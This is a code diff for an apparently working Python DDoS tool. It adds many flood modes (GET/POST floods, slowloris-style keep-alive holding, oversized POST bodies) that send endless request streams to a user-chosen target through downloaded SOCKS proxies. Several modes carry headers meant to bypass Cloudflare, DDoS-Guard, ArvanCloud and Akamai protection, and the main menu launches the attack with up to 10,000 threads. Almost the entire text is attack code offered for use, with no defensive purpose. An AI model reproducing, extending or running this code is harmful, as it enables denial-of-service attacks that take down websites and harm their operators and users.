+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def null(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: \r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def cookie(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				random_cookie = f"id={Intn(1, 999999)}; session={randomurl()}; __cfruid={randomurl()}"
+				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nCookie: {random_cookie}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def pps(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(1000):
+				req = "GET / HTTP/1.1\r\n\r\n"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def even(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				extra_headers = f"X-Custom-1: {randomurl()}\r\nX-Custom-2: {randomurl()}\r\nX-Custom-3: {randomurl()}\r\nX-Custom-4: {randomurl()}\r\n"
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{extra_headers}{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def gsb(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def dgb(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("ddosguard_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def avb(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("arvancloud_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def bot(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def apache(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("apache_bypass")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def xmlrpc(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(200):
+				payload = "<?xml version='1.0'?><methodCall><methodName>system.listMethods</methodName></methodCall>"
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"POST /xmlrpc.php HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 200
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def cfbuam(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}CF-UAM-Bypass: 1\r\n{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def bypass(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(500):
+				bypass_headers = apply_ultra_bypass_headers(Choice(list(ULTRA_BYPASS_HEADERS.keys())))
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 500
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def killer(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(2000):
+				bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 2000
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def advanced(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	bypass_types = list(ULTRA_BYPASS_HEADERS.keys())
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(1000):
+				bypass_type = Choice(bypass_types)
+				bypass_headers = apply_ultra_bypass_headers(bypass_type)
+				req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def amplify(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(1000):
+				payload = "data=" + "A"*30000
+				bypass_headers = apply_ultra_bypass_headers("waf_bypass")
+				req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 1000
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def hybrid(event,socks_type,ind_rlock):
+	proxy = Choice(proxies).strip().split(":")
+	add = "?" if "?" not in path else "&"
+	event.wait()
+	while True:
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+			s.settimeout(2)
+			s.connect((str(target), int(port)))
+			if protocol == "https":
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			for n in range(800):
+				if n % 2 == 0:
+					bypass_headers = apply_ultra_bypass_headers("cloudflare_super")
+					req = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n{bypass_headers}{GenReqHeader('get')}"
+				else:
+					payload = f"id={Intn(1,999999)}&data={randomurl()}"
+					bypass_headers = apply_ultra_bypass_headers("akamai_ultra")
+					req = f"POST {path} HTTP/1.1\r\nHost: {target}\r\nContent-Length: {len(payload)}\r\n{bypass_headers}{GenReqHeader('post')}\r\n{payload}"
+				sent = s.send(str.encode(req))
+				stats.add_request(sent)
+				if not sent: break
+			s.close()
+			ind_rlock.acquire()
+			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += 800
+			ind_rlock.release()
+		except:
+			stats.add_error()
+
+def tor(conn,socks_type):
+	proxy = Choice(proxies).strip().split(":")
+	for _ in range(conn):
+		try:
+			s = socks.socksocket()
+			s.set_proxy(socks.SOCKS5 if socks_type==5 else socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+			s.settimeout(1)
+			s.connect((str(target), int(port)))
+			if str(port) == '443':
+				ctx = ssl.SSLContext()
+				ctx.check_hostname = False
+				ctx.verify_mode = ssl.CERT_NONE
+				s = ctx.wrap_socket(s,server_hostname=target)
+			s.send(f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n".encode("utf-8"))
+			socket_list.append(s)
+		except:
+			pass
+	while True:
+		for s in list(socket_list):
+			try:
+				s.send(f"X-tor: {Intn(1, 5000)}\r\n".encode("utf-8"))
+				stats.add_request(20)
+			except:
+				try:
+					socket_list.remove(s)
+					s.close()
+				except:
+					pass
+
+def prevent():
+	if '.gov' in url :
+		print("~ You can't attack .gov website!")
+		exit()
+	
+def main():
+	global multiple
+	global choice
+	global data
+	global mode2
+	global cookies
+	global brute
+	global url
+	global proxies
+	
+	modes_list = ["cc", "post", "head", "ovh", "rhex", "stomp", "stress", "dyn", "downloader", 
+				  "slow", "cfb", "null", "cookie", "pps", "even", "gsb", "dgb", "avb", 
+				  "bot", "apache", "xmlrpc", "cfbuam", "bypass", "killer", "tor", "advanced",
+				  "amplify", "hybrid", "cannon", "turbo", "overdrive"]
+	
+	print(f"\n{Fore.LIGHTMAGENTA_EX}Available Modes:{Fore.RESET}")
+	print(f"{Fore.CYAN}cc/post/head/ovh/rhex/stomp/stress/dyn/downloader/slow/cfb/null/cookie/pps/even/gsb/dgb/avb/bot/apache/xmlrpc/cfbuam/bypass/killer/tor/advanced/amplify/hybrid/cannon/turbo/overdrive{Fore.RESET}\n")
+	
+	# Download real proxies
+	proxies = download_real_proxies()
+	
+	if not proxies:
+		print(f"{Fore.LIGHTRED_EX}[!] No proxies downloaded! Trying manual input...{Fore.RESET}")
+		proxy_file = input(f"{Fore.CYAN}[?] Enter proxy file path: {Fore.RESET}")
+		try:
+			proxies = [p.strip() for p in open(proxy_file).readlines() if p.strip() and ':' in p]
+		except:
+			print(f"{Fore.LIGHTRED_EX}[!] Cannot read proxy file!{Fore.RESET}")
+			return
+	
+	if len(proxies) < 10:
+		print(f"{Fore.LIGHTYELLOW_EX}[!] Warning: Only {len(proxies)} proxies available. Recommended: 100+{Fore.RESET}")
+	
+	mode = InputOption("~ Choose Your Mode (default=cannon) :", modes_list, "cannon")
+	url = str(input(f"{Fore.CYAN}~ Input the target url:{Fore.RESET} ")).strip()
+	prevent()
+	ParseUrl(url)
+	
+	if mode == "post":
+		mode2 = InputOption("~ Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		if mode2 == "y":
+			data = open(str(input("~ Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
+			data = ' '.join([str(txt) for txt in data])
+	
+	choice2 = InputOption("~ Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	if choice2 == "y":
+		cookies = str(input("Please input the cookies:")).strip()
+	
+	choice = InputOption("~ Choose your socks mode(4/5, default=5):",["4","5"],"5")
+	if choice == "4":
+		socks_type = 4
+	else:
+		socks_type = 5
+	
+	if mode in ["slow", "tor"]:	
+		thread_num = str(input(f"{Fore.CYAN}~ Connections(default=2000):{Fore.RESET} "))
+	else:
+		thread_num = str(input(f"{Fore.CYAN}~ Threads(default=10000):{Fore.RESET} "))
+	
+	if thread_num == "":
+		thread_num = int(10000) if mode not in ["slow", "tor"] else int(2000)
+	else:
+		try:
+			thread_num = int(thread_num)
+		except:
+			sys.exit("Error thread number")
+	
+	if len(proxies) == 0:
+		print(f"{Fore.LIGHTRED_EX}~ There are no more proxies. Please download a new one.{Fore.RESET}")
+		return
+	
+	ind_rlock = threading.RLock()
+	
+	print(f"\n{Fore.LIGHTGREEN_EX}{'='*70}")
+	print(f"{'ATTACK CONFIGURATION':^70}")
+	print(f"{'='*70}")
+	print(f"Method....................: {Fore.LIGHTYELLOW_EX}{mode.upper()}{Fore.RESET}")
+	print(f"Target....................: {Fore.LIGHTYELLOW_EX}{target}:{port}{Fore.RESET}")
+	print(f"Threads....................: {Fore.LIGHTYELLOW_EX}{thread_num}{Fore.RESET}")
+	print(f"Proxies....................: {Fore.LIGHTYELLOW_EX}{len(proxies)}{Fore.RESET}")
+	print(f"Bypass System.............: {Fore.LIGHTYELLOW_EX}ULTRA MULTI-LAYER{Fore.RESET}")
+	print(f"{Fore.LIGHTGREEN_EX}{'='*70}{Fore.RESET}\n")
+	
+	if mode in ["slow", "tor"]:
+		input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start...{Fore.RESET}")
+		th = threading.Thread(target=slow if mode=="slow" else tor, args=(thread_num,socks_type,))
+		th.setDaemon(True)
+		th.start()
+	else:
+		multiple = str(input(f"{Fore.CYAN}~ Magnification(default=100):{Fore.RESET} "))
+		if multiple == "":
+			multiple = int(100)
+		else:
+			multiple = int(multiple)
+		brute = str(input(f"{Fore.CYAN}~ Enable boost mode[beta](y/n, default=y):{Fore.RESET} "))
+		if brute == "":
+			brute = False
+		elif brute == "y":
+			brute = True
+		elif brute == "n":
+			brute = False
+		event = threading.Event()
+		print(f"{Fore.LIGHTCYAN_EX}[*] Building {thread_num} threads...{Fore.RESET}")
+		SetupIndDict()
+		build_threads(mode, thread_num, event, socks_type, ind_rlock)
+		event.clear()
+		input(f"{Fore.LIGHTYELLOW_EX}[*] Press ENTER to start attack...{Fore.RESET}")
+		event.set()
+		print(f"\n{Fore.LIGHTRED_EX}{'🔥 ATTACK STARTED - ULTRA FIREPOWER 🔥':^70}{Fore.RESET}\n")
+		threading.Thread(target=OutputToScreen, args=(ind_rlock,), daemon=True).start()
+	
+	while True:
+		try:
+			time.sleep(0.1)
+		except KeyboardInterrupt:
+			print(f"\n\n{Fore.LIGHTYELLOW_EX}{'='*70}")
+			print(f"{'ATTACK STOPPED':^70}")
+			stat = stats.get_stats()
+			print(f"{'='*70}")
+			print(f"Total Requests: {stat['requests']:,}")
+			print(f"Peak RPS: {stat['peak_rps']:,.0f}")
+			print(f"Data Sent: {stat['mbps']:.2f} MB/s")
+			print(f"Success Rate: {stat['success_rate']:.1f}%")
+			print(f"{'='*70}{Fore.RESET}\n")
+			break
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except Exception as e:
-        print(f"{Fore.LIGHTRED_EX}[!] Error: {e}{Fore.RESET}")
-        logger.log("ERROR", str(e))
+	try:
+		main()
+	except Exception as e:
+		print(f"{Fore.LIGHTRED_EX}[!] Error: {e}{Fore.RESET}")
